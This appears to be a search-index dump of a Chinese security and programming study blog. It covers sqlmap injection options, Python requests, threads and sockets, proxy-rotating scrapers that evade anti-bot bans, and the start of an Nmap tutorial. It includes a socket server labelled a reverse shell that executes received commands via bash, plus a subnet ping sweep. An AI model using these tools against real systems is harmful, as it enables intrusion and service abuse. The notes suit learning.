Cookie在level为2的时候都会测试，HTTP User-Agent/Referer头在level为3的时候就会测试，在不确定那个payload或者参数为注入点的时候建议用高level值 风险等级：–risk；共有四个风险等级默认1，测试大部分语句，2增加基于时间的测试语句，3增加OR语句的SQL注入测试，例如，有时候在UPDATE的语句中，注入一个OR的测试语句，可能导致更新整个表，造成很大的风险，同样在xml/payloads/中找到，也可以自行添加payload 12.SQLMAP注入学习 了解sqlmap目录结构 doc/—&gt;&gt;&gt;&gt;sqlmap具体使用说明 extra/—&gt;&gt;&gt;&gt;sqlmap的额外功能 lib/—&gt;&gt;&gt;&gt;sqlmap多种链接库 plugins/—&gt;&gt;&gt;&gt;各种数据库信息和数据库通用事项 procs/—&gt;&gt;&gt;&gt;mssqlserver、mysql、Oracle、postgresql的出发程序 shell/—&gt;&gt;&gt;&gt;注入成功后多种shell远程连接命令执行的管理数据库 tamper/—&gt;&gt;&gt;&gt;绕过脚本 thirdparty/—&gt;&gt;&gt;&gt;第三方插件 txt/—&gt;&gt;&gt;&gt;字典 udf/—&gt;&gt;&gt;&gt;用户自定义的攻击载荷 waf/—&gt;&gt;&gt;&gt;常见的防火墙特征，使用–identify-waf进行检测 xml/—&gt;&gt;&gt;&gt;数据库的注入检测载荷、旗标信息以及其他信息，可以通过查看分析该文件学习注入技术 学习sqlmap注入 -v参数的使用，7个等级， 0：只显示Python错误以及严重的信息； 1：同时显示信息和警告信息； 2：同时显示debug信息； 3：同时显示注入的payload； 4：同时显示HTTP请求； 5：同时显示HTTP响应头； 6：同时显示HTTP相应页面 sqlmap.py -u &quot;URL&quot; --dbs -v 3 调用BurpSuite(也要配置代理) sqlmap.py -u &quot;URL&quot; --proxy=&quot;http://127.0.0.1:8080&quot;","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"SQLMAP","slug":"SQLMAP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/SQLMAP/"},{"name":"数据库注入","slug":"数据库注入","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/数据库注入/"}]},{"title":"Python Web编程","slug":"Python-Web编程","date":"2019-01-13T22:14:39.000Z","updated":"2019-01-13T22:15:28.122Z","comments":true,"path":"2019/01/14/Python-Web编程/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Python-Web编程/","excerpt":"","text":"Python 编程 查看源代码 print help(base64) or print base64.__file__ Python正则表达式123import repattern = re.compile('hello')match = pattern.match('hello world!') 或者1word = re.findall('hello'.'hello word') |一般字符|功能|正则表达式|匹配结果| |-------|----|----|-----| | **.** | 匹配任意换行符以外的字符 | h. | ht or hb ... | | **\\\\** | 转义字符 | \\\\\\\\ | \\ | | **[...]** | 字符集，对应位置可以是字符，也可以是范围，第一个字符如果是‘^’则表示取反，所有特殊字符在字符集中均失去原有含义，使用是可以加反斜杠 | [0-9] |616 or ...| | **\\d** | 匹配数字 | a\\dc | a1c | | **\\D** | 匹配非数字 | | | **\\s** | 空白字符 [&lt;空格&gt;\\t\\r\\f\\v] | a\\sb | a b | | **\\S** | 非空白字符 [^\\s] | | | **\\w** | 单词字符 [A-Za_z0-9] | a\\wc | abc | | **\\W** | 非单词字符 [^\\w] | | | **\\*** | 匹配前一个字符0次或无限次 | abc* | ab or abcccccc | | **+** | 匹配前一个字符1次或无限次 | abc+ | abc or abcccccc | | **?**| 匹配前一个字符0次或1次 | abc? | ab or abc | | **{m}** | 匹配前一个字符m次 | ab{3}c | abbbc| | **{m,n}** | 匹配前一个字符m次至n次 | ab{1,2}c | abc or abbc| | **\\|** | 表示匹配左右两个表达是中的一个,先左后右，左边成功则结束，如果‘\\|’没有包含在（）中则它的范围是整个正则表达式 | abc\\|abf | abc or def| | **(..)** | 被括起来的表达式作为一个分组，\\|的范围仅仅在括号内 | (abc){2}a(123\\|456)c |abcabca123c| Python编译选项指定 |使用方法|功能| |——-|—-| | re.I | 忽略大小写 | | re.L | 使用预定义字符类\\w\\W\\b\\B\\s\\S取决当前区域设定 | | re.M | 多行模式改变‘^’和‘$’的行为 | | | re.S | .任意匹配模式 | | re.U | 使用预定义字符类\\w\\W\\b\\B\\s\\S\\d\\D取决于Unicode定义的字符属性 | | re.X | 详细模式，可以多行，忽略空白字符，并且可以加入注释 | 贪婪模式与非贪婪模式 Python Web编程 urllib urllib.urlopen() urllib.urlretrieve() 下载文件1234urlretrieve(url , filename=None , reporthook=None , data=None)For example:urlretrieve(\"https://www.baidu.com/img/bd_logo1.png\" , filename=Document/temp/baidu.png)filename是文件下载后保存的地址 urllib2 urllib2.urlopen() urllib2.Requests() 定制请求头等 requests 第三方库文件，需要安装pip install requests 发送请求 123456r = requests.get(&quot;https://www.baidu.com/&quot;)r = requests.post(&quot;https://www.baidu.com/&quot;)r = requests.put(&quot;https://www.baidu.com/&quot;)r = requests.delete(&quot;https://www.baidu.com/&quot;)r = requests.head(&quot;https://www.baidu.com/&quot;)r = requests.options(&quot;https://www.baidu.com/&quot;) 为URL传递参数 1234payload = &#123;&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125;r = requests.get(&quot;https://www.baidu.com&quot;,params = payload )print (url) https://www.baidu.com?key2=value2&amp;key1=value1 响应内容 1234r = requests.get(&quot;https://www.baidu.com/&quot;)r.textr.encode&apos;utf-8&apos;r.encode = &apos;ISO-8859-1&apos; 二进制响应内容 12r = requests.get(&quot;https://www.baidu.com/&quot;)r.content 定制请求头 1234url = &quot;https://www.baidu.com/&quot;headers = &#123;&apos;content-type&apos;:&apos;application/json&apos;&#125;r = repuests.get(url,headers=headers)header中可以加入cookie 复杂的post请求 12payload = &#123;&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125;r = requests.post(&quot;https://www.baidu.com/post&quot;,data = payload) 响应状态码 12r = requests.get(&quot;https://www.baidu.com/&quot;)r.status_code 响应头 1r.headers Cookie 12r.cookiesr.cookies[&apos;example cookie name&apos;] 超时 1requests.get(&quot;https://www.baidu.com/post&quot;,timeout = 0.001) 错误和异常 1遇到网络问题时（如：DNS查询失败，拒绝链接等），Requests会抛出一个ConnectionError异常。遇到罕见的无效HTTP响应时，Requests则会抛出一个HTTPError异常，若请求超时，则会抛出Timeout异常 123456789101112131415161718192021222324252627282930313233343536#coding=utf-8import requestsimport jsondef spider(url, data): headers = &#123; 'Host': 'www.ichunqiu.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'https://www.ichunqiu.com/courses', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Content-Length': '94', 'Cookie': 'ci_session=da3cb5472ee493e4cab3f607c2eb1376d8d8f1ec; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; __jsluid=227eea42ddcdc5dfd20ce94113679b2a; UM_distinctid=161d204f2129-01b579968a5537-4c322172-1fa400-161d204f214d5; CNZZDATA1262179648=831575282-1519646472-%7C1519651893; pgv_pvi=9857672192; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1519646998,1519647981,1519654917,1519655470; pgv_si=s9058514944; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1519655470', 'Connection': 'close', &#125; r = requests.post(url=url,headers=headers, data=data) #print (r.text) data = json.loads(r.text) for i in range(len(data['course']['result'])): print data['course']['result'][i]['courseName']for i in range(1,18 ): url = 'https://www.ichunqiu.com/courses/ajaxCourses' data = &#123;'pageIndex':'0'&#125; page = str(i) data['pageIndex'] = page spider(url, data)#print courses_dict[0].encode('utf-8') Python多线程编程 thread 模块使用这种方法一定要加上time.sleep() 1start_new_thread(function,args kwargs=None) 12345678910111213import threadimport timedef fun1(): print (\"hello world! %s\"%time.ctime())def main(): thread.start_new_thread(fun1, ()) thread.start_new_thread(fun1, ()) time.sleep(2)if __name__ =='__main__': main() 123456789101112131415161718192021#对该网段内存活的主机进行探测import threadimport timefrom subpocess import Popen, PIPEdef main(): for i in range(1, 255): ip = '192.168.43.'+str(i) thread.start_new_thread(ping_check, (ip, )) time.sleelp(0.01) ping_check()def ping_check(ip): check = Popen(['bin/bash', '-c', 'ping -c 2'+ip], stdin=PIPE, stout=PIPE) data = check.stout.read() if 'ttl' in data: print '%s is UP'%ipif __name__ == \"__main__\": main() 12345678910111213141516171819202122import threadingimport timedef fun1(keys): print ('Hello %s:%s'%(keys, time.time()))def main(): threads = [] keys = ['lixu', 'hancong', 'tianhao'] threads_count = len(keys) for i in range(threads_count): t = threading.Thread(target=fun1, args=(keys[i], )) threads.append(t) for i in range(threads_count): threads[i].start() for i in range(threads_count): threads[i].join()if __name__ == '__main__': main() 1234567891011121314151617181920212223242526272829303132#coding=utf-8#同时开十个进程访问百度import threadingimport timeimport requestsimport sysdef fun1(): time_start = time.time() r = requests.get(url='https://www.baidu.com') times = time.time() - time_start sys.stdout.write(\"Status: %s---%s---%s\\n\"%(r.status_codes, times, time.strftime('%H:%M:%S')))def main(): threads = [] threads_count = 10 for i in range(threads_count): t = threading.Thread(target=fun1, args=()) threads.append(t) for i in range(threads_count): threads[i].start() for i in range(threads_count): threads[i].join()if __name__ == '__main__': main() 12345678910111213141516171819202122232425262728293031323334353637383940#coding=utf-8import threadingimport Queuefrom subprocess import Popen, PIPEimport sysclass DoRun(threading.Thread): def __init__(self, queue): threading.Thread.__init__(self) self._queue = queue def run(self): while not self.empty(): ip = self._queue.get() #print ip check_ping = Popen(['/bin/bash', '-c', 'ping -c 2'+ip], stdin=PIPE, stdout=None) data = check_ping.stdout.read() if 'ttl' in data: sys.stdout.write(ip+' is UP\\n')def main(): threads=[] threads_count = 10 queue = Queue.Queue() for i in range(1, 255): queue.put(\"192.168.43.\"+str(i)) for i in range (threads_count): threads.append(DoRun(queue)) for i in threads: i.start() for i in threads: i.join()if __name__ == \"__main__\": main() Python网络编程 C/S架构 客户机和服务器架构，Server的唯一目的是等待Client的请求，Client链接上Server后，发送数据并由Server处理，然后Server将处理后的数据交给Client C/S网络编程 套接字 类似于通信端点的概念的网络数据结构 Socket模块 该模块的socket()方法用来创建套接字socket(socket_family,socket_type,protocol=0) 12For example:(create a tcp socket)tcpsock = socket(socket.AF_INET,socket.SOCK_STREAM) |服务端套接字函数|功能| |———|——–| | s.bind() | 绑定地址到套接字 | |s.listen() | 开始监听TCP端口 | | s.accept() | 被动接受TCP客户端连接，（阻塞式）等待连接的到来 | |客户端套接字函数|功能| |————|—————| | s.connect() | 主动初始化TCP服务连接 | | s.connect_ex() | connect()函数的扩展版本，出错时返回错误代码，而不是返回异常 | |公共用途套接字函数|功能| |——————-|————-| | s.recv() | 接受TCP数据 | | s.send() | 发送TCP数据 | | s.sendall() | 完整发送TCP数据 | | s.recvfrom() | 接受UDP数据 | | s.sendto() | 发送TCP数据 | | s.getpeemame() | 接收到当前套接字的远端地址 | | s.getsockname() | 当前套接字的地址 | | s.getsockopt() | 返回指定套接字的参数 | | s.setsockopt() | 这只指定套接字的参数 | | s.close() | 关闭当前套接字 | 简单的python服务器与客户端脚本，反弹shell 12345678910111213141516171819202122232425262728293031#Server服务端#coding=utf-8#！/usr/bin/env pythonfrom socket import *from time import *from subprocess import *HOST = ''PORT = 5567BUFFER = 1024ADDR = (HOST, PORT)tcpServer = socket(AF_INET, SOCK_STREAM)tcpServer.bind(ADDR)tcpServer.listen(5)while True: print \"waiting for connection...\" tcpClient,addr = tcpServer.accept() print \"..Connected from : \",addr while True: data = tcpClient.recv(BUFFER) if not data: break cmd = Popen(['/bin/bash','-c',data],stdin=PIPE,stdout=PIPE) data = cmd.stdout.read() tcpClient.send('[%s] : %s'%(ctime(), data))tcpClient.close()tcpServer.colse() 1234567891011121314151617181920212223242526#Client客户端#coding=utf-8#!/usr/bin/env pythonfrom socket import *HOST = '192.168.43.23' #根据要访问的服务器IP而定PORT = 5567BUFFER = 1024ADDR = (HOST, PORT)tcpClient = socket(AF_INET, SOCK_STREAM)tcpClient.connect(ADDR)while True: data = raw_input('~: ') if not data: break tcpClient.send(data) data = tcpClient.recv(BUFFER) if not data: break print datatcpClient.close() Python数据库编程 Python DB API 数据通道（数据库连接对象connection） 数据（数据库交互对象cursor） 异常（数据库异常类exceptions） 访问流程： 创建connection连接，获取cursor，执行操作，关闭cursor，关闭connection Python MySQL开发环境 python代码 ——-&gt; MySQL for Python ——-&gt; 数据库服务器 Python数据库编程实例 数据库连接对象connection 链接对象：建立Python客户端与数据库的网络连接 创建方法：MySQLdb.Connect(参数) | 参数名 | 类型 | 说明 | |---------|------|------| | host | 字符串 | MySQL服务器地址 | | port | 数字 | MySQL服务器端口号 | | user | 字符串 | 用户名 | | passwd | 字符串 | 密码 | | db | 字符串 | 数据库名 | | charset | 字符串 | 连接编码 | connection对象支持方法 | 方法名 | 说明 | |--------|-----| | cursor() | 使用该连接创建并返回游标 | | commit() |提交当前事务 | | rollback() | 回滚当前事务 | | close() | 关闭当前事务 | cursor对象支持的方法 | 参数名 | 说明 | |---------|----------| | execute(op[,args]) | 执行一个数据库查询命令 | | fetchone() | 取得结果集里的下一行 | | fetchmanv(size) | 取得结果集里的下几行 | | fetchall() | 取得结果集里的下几行 | | rowcount() | 最近一次execute返回的数据的函数或影响行数 | | close() | 关闭 | 123456789101112131415#简单的数据库编程实例#！/usr/bin/env pythonimport MySQLdbconn = MySQLdb.connect(host = '192.168.43.100', port = 3360, user = 'root', passwd = '123#@!')cus = conn.cursor()sql = 'select version()'cus.execute(sql)print cus.fetchone()cus.close()conn.close() 另一个实例结合的是web编程的爬虫所展开","categories":[{"name":"编程","slug":"programming","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/programming/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Python/"},{"name":"Requests","slug":"Requests","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Requests/"},{"name":"re","slug":"re","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/re/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/正则表达式/"}]},{"title":"Python Web编程之反爬机制绕过","slug":"Python-Web编程之反爬机制绕过","date":"2019-01-13T22:12:59.000Z","updated":"2019-01-13T22:13:40.986Z","comments":true,"path":"2019/01/14/Python-Web编程之反爬机制绕过/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Python-Web编程之反爬机制绕过/","excerpt":"","text":"python web编程之反爬机制绕过 从一道逆向题引发的思考： 能否直接将要解密的数据，通过python脚本的的方式，提交给相应的网站，并通过脚本抓取相应的结果 现在的网站都添加了相应的反爬取机制，刚开始的几次是可以成功的，但是之后脚本就无法接收到数据了，发现网站上多了一个输入验证码的环节 具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本 具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本 具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本 查询的一些基础资料： https://www.cnblogs.com/heikeboke/p/8012041.html http://www.jb51.net/article/95728.htm https://www.cnblogs.com/yoyoketang/p/6838596.html 反爬取方式及解决思路： 从用户请求的Headers反爬虫 伪装header123456789101112131415161718#mechanize库中的用法br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36')]#常见的添加定制的 headers（示例如下）headers =&#123; \"Host\": \"www.cmd5.com\", \"Content-Length\": \"1832\", \"Cache-Control\": \"max-age=0\", \"Origin\": \"http://www.cmd5.com\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"Referer\": \"http://www.cmd5.com/\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Cookie\": \"FirstVisit=2017/10/14 16:49:39; ASP.NET_SessionId=4240erfxxgel3450n4dgddej; comefrom=https://www.baidu.com/link?url=_iyok742ki838ontfqnni8s-yikrus241ocxk3cplqo&amp;wd=&amp;eqid=ed2c528f0003fd1a000000055b18de2e; Hm_lvt_0b7ba6c81309fff7ce4498ec7b107c0b=1528302253,1528328811,1528356400; Hm_lpvt_0b7ba6c81309fff7ce4498ec7b107c0b=1528356400\", \"Connection\": \"close\"&#125; 基于用户行为反爬虫（同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作） IP代理 https://www.cnblogs.com/eric8899/p/6122759.html https://www.cnblogs.com/hearzeus/p/5157016.html https://www.jianshu.com/p/2577e5bcbf051234567#使用request库加代理参数的方法import requestsproxy = &#123;'HTTPS': '117.85.105.170:808','HTTP':'117.85.105.170:808'&#125;head = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36', 'Connection': 'keep-alive'&#125;p = requests.get('http://icanhazip.com', headers=head, proxies=proxy)print(p.text) 1234567891011121314151617181920212223#获取代理IP列表的简单尝试#encoding=utf8import urllib2import BeautifulSoupUser_Agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'header = &#123;&#125;header['User-Agent'] = User_Agenturl = 'http://www.xicidaili.com/nn/1'req = urllib2.Request(url,headers=header)res = urllib2.urlopen(req).read()soup = BeautifulSoup.BeautifulSoup(res)ips = soup.findAll('tr')f = []for x in range(1,len(ips)): ip = ips[x] tds = ip.findAll(\"td\") ip_temp = tds[1].contents[0]+\"\\t\"+tds[2].contents[0]+\"\\n\" # print tds[2].contents[0]+\"\\t\"+tds[3].contents[0] f.append(ip_temp) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#网上的一个爬段子的代码，我自己改了改，这个比较典型，包含了ip代理和请求头的不断更换，实现欺骗服务器的目的# encoding=utf8#网站反爬虫：一个IP频繁访问就先将该IP加入黑名单#反爬虫策略：限制IP访问频率，超过频率就自动断开：降低爬虫的速度，在每个请求前加time.sleep,或更换IP#策略二：后台对访问进行统计，如果单个userAgent访问超过阈值，予以封锁：误伤较大，一般网站不使用#策略三：针对cookies：一般网站不使用import requestsimport reimport urllib2import randomimport timefrom bs4 import BeautifulSoup#首先，我们找一个发布代理IP的网站，从该网站爬取代理IP来访问网页，当本地IP失效，启用代理IPclass download(object): def __init__(self): self.ip_list=[] #初始化列表用来存储获取到的IP User_Agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0' header = &#123;&#125; header['User-Agent'] = User_Agent html = requests.get(\"http://www.xicidaili.com/nn/1\", headers=header) response = html.text soup = BeautifulSoup(response,'lxml') ips = soup.findAll('tr') for x in range(1, len(ips)): ip = ips[x] tds = ip.findAll(\"td\") ip_temp = tds[1].contents[0] + \":\" + tds[2].contents[0] + \"\\n\" # print tds[2].contents[0]+\"\\t\"+tds[3].contents[0] self.ip_list.append(ip_temp) print self.ip_list self.user_agent_list=[ \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\", \"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6\", \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5\", \"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\", \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\", \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\" ] def get(self,url,timeout,proxy=None,num_retries=6): ua=random.choice(self.user_agent_list) #从user_agent_list中随机抽取出一个字符串 # print(ua) header=&#123;\"User-Agent\":ua&#125; #构造一个完整的User_Agent if proxy==None: #当代理为空时，不使用代理获取response try: response=requests.get(url,headers=header,timeout=timeout) return response except: if num_retries&gt;0: time.sleep(10) print(u\"获取网页错误，10s后将获取倒数第：\",num_retries,u\"次\") return self.get(url,timeout,num_retries-1) #调用自身并将次数减1 else: print(u\"开始使用代理\") time.sleep(10) IP=\"\".join(str(random.choice(self.ip_list)).strip()) proxy=&#123;\"http\":IP&#125; return self.get(url,timeout,proxy) else: try: IP=\"\".join(str(random.choice(self.ip_list)).strip()) #随机取IP并去除空格 proxy=&#123;\"http\":IP&#125; #构造一个代理 response=requests.get(url,headers=header,proxies=proxy,timeout=timeout) #使用代理来获取response return response except: if num_retries&gt;0: time.sleep(10) IP=\"\".join(str(random.choice(self.ip_list)).strip()) print(u\"正在更换代理，10s后将重新获取第\",num_retries,u\"次\") print(u\"当前代理是：\",proxy) return self.get(url,timeout,proxy,num_retries-1) else: print(u\"代理发生错误，取消代理\") return self.get(url,3)request=download()def qsbk(url): # header=&#123; # 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', # 'Accept-Encoding': 'gzip, deflate, sdch', # 'Accept-Language': 'zh-CN,zh;q=0.8', # 'Cache-Control': 'max-age=0', # 'Connection': 'keep-alive', # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.235' # &#125; # rep=requests.get(url,headers=header) # html=rep.text # bs=BeautifulSoup(html,\"html.parser\") # body=bs.body #获取html文件的body部分 # data=body.find_all(\"div\",&#123;\"class\":\"content\"&#125;) #此时的他为set 类型 # for joke in data: # joke_duan=joke.find(\"span\") # if \"&lt;br/&gt;\" not in str(joke_duan): #如果段子中有&lt;br/&gt;，则string会变为None # print(joke_duan.string) # print(\"\") # # with open(\"joke.txt\",\"w\") as f: # # f.write(joke_duan.string) html=request.get(url,3) dz=BeautifulSoup(html.text,\"html.parser\").find_all(\"div\",&#123;\"class\":\"content\"&#125;) #获取一个集合 # print(dz) # print(len(dz)) for joke in dz: #joke为一段html代码 duanzi=joke.get_text() print(duanzi)if __name__==\"__main__\": url=\"http://www.qiushibaike.com/\" qsbk(url) 每次请求后随机间隔几秒再进行下一次请求 脚本里添加控制访问时间的代码，如sleep等123#!/usr/bin/python3import timetime.sleep( 5 ) 选择一个同类的没有防爬机制的网站，这个方法很佛系，应该说不能算是一个应对反爬机制的方法 需要尽快完成脚本的时候可以使用 缺点：避开了问题而没有解决问题，不一定能找到12345678910111213141516171819202122232425262728293031323334#这里提供一个没有反爬机制的网站的方法#使用mechanize库，模拟浏览器的行为#首先要知道对这个网站的请求头，可以通过BurpSuite抓一个# _*_ coding:utf-8 _*_import requestsimport mechanizeimport reflagmd5 = '762306AB890905CFF6887D5A75776382'def web_md5(md5_string): br = mechanize.Browser() # 设置是否处理HTML http-equiv标头 br.set_handle_equiv(True) # 设置是否处理重定向 br.set_handle_redirect(True) # 设置是否向每个请求添加referer头 br.set_handle_referer(True) # 设置是不遵守robots中的规则 br.set_handle_robots(False) # 处理giz传输编码 br.set_handle_gzip(False) # 设置浏览器的头部信息 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36')] br.open('http://pmd5.com/') #for form in br.forms(): # print form #如果知道表单结构这里就可以注释掉 br.select_form(name = \"formMd5\") br.form['key'] = md5_string br.submit() page = br.response().read() pattern = \"&lt;em&gt;.&#123;4&#125;&lt;/em&gt;”!&lt;/p&gt;&lt;/div&gt;\" flag = re.findall(pattern,page,flags=0) print flag if flag: print flag[0][4:8] print pageweb_md5(flagmd5) 动态页面的反爬虫 Selenium+PhantomJS Selenium：pip install Selenium Selenium是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动化操作，不同是Selenium可以直接运行在浏览器上，它支持所有主流的浏览器(包括PhantomJS这些无界面的浏览器)。Selenium可以根据我们的指令，让浏览器自动加载页面，获取需要的页面，甚至页面截屏，或者判断网站上某些动作是否发生。Selenium自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。但是我们有时候需要让它内嵌在代码中运行，所有我们而已用一个叫PhantomJS的工具代替真实的浏览器。 PhantomJS ： 下载安装包，添加环境变量 PhantomJS是一个基于Webkit的”无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器更高效。如果我们把Selenium和PhantomJS结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理JavaScript、Cookie、headers，以及任何我们真实用户需要做的事情。 使用方法，参考链接 https://www.cnblogs.com/miqi1992/p/8093958.html https://www.cnblogs.com/psv-fuyang/articles/7891871.html https://blog.csdn.net/qq_30242609/article/details/70859891 https://jiayi.space/post/scrapy-phantomjs-seleniumdong-tai-pa-chong#fb_new_comment https://blog.csdn.net/qq_33689414/article/details/78631009 https://www.cnblogs.com/luxiaojun/p/6144748.html https://www.jianshu.com/p/520749be7377 https://www.jianshu.com/p/9d408e21dc3a https://segmentfault.com/a/1190000007362337 当你大概了解了上面的内容之后会发现，好吧，这两个狗子已经分手了 高版本的Selenium不再支持PhantomFS https://blog.csdn.net/u010358168/article/details/79749149 https://blog.csdn.net/qq_30242609/article/details/79323963 解决问题的思路： Selenuim版本降级 使用无界面浏览器 相关环境配置：https://blog.csdn.net/pengbin790000/article/details/76696714 Selenuim教程 https://www.cnblogs.com/fnng/category/349036.html 感觉要学这个的话需要一定的时间：这里提供一个视频教程网站，这里面有详细的课程，可以学的比较完整 视频：http://www.51zxw.net/list.aspx?cid=615 文字：http://www.51testing.com/zhuanti/selenium.html","categories":[{"name":"编程","slug":"programming","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/programming/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/爬虫/"},{"name":"反爬虫","slug":"反爬虫","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/反爬虫/"}]},{"title":"Nmap使用教程","slug":"Nmap使用教程","date":"2019-01-13T22:11:48.000Z","updated":"2019-01-13T22:12:23.542Z","comments":true,"path":"2019/01/14/Nmap使用教程/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Nmap使用教程/","excerpt":"","text":"Nmap使用教程 tags: Tips@Hak5.org,Hak5.org,metasploitminute.com,http://creativecommons.org/licenses/by-nc-sa/3.0/us/,Hakshop.com User Code:SNUBS,nmap.org/download,http://nmap.org/nsedoc/(这是nmap脚本的链接) 1.安装与初次使用 在终端上查看Nmap的版本 nmap --version //如果没有安装 apt-get install nmap 查看计算机的端口状态 nmap 192.168.43.80 2 扫描多个目标，查看工作状态nmap 192.168.43.80 192.168.43.176 192.168.43.100 //等同于 namp 192.168.43.80,100,176 nmap 192.168.43.1-100 //扫描1到100 nmap 